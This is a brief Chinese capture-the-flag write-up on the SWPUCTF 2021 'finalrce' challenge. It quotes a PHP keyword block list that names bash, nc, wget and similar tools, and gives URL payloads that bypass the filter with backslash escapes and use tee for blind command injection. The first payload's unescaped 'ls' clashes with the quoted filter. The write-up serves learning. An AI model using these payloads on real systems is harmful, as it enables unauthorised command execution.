# 【SWPUCTF 2021 新生赛】finalrce


# [SWPUCTF 2021 新生赛]finalrce

## 思路
* 主要问题：
  1. 过滤很多关键字，但是反斜杠未被过滤，使用转义符进行绕过
  
     ```
     preg_match(&#39;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&#34;|\&gt;|\&lt;|\%|\$/i&#39;,$url)
     ```
  
  1.  使用exec($url);执行命令，不能直接回显，需要管道符&#43;tee重定向写入文件进行回显查看

## EXP
`?url=ls /|tee 1.txt	# 得到目录`

`?url=ca\t /flllll\aaaaaaggggggg|tee 2.txt; 	# 得到flag`

## 总结
* 考察无回显RCE
* WAF绕过

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bfinalrce/  

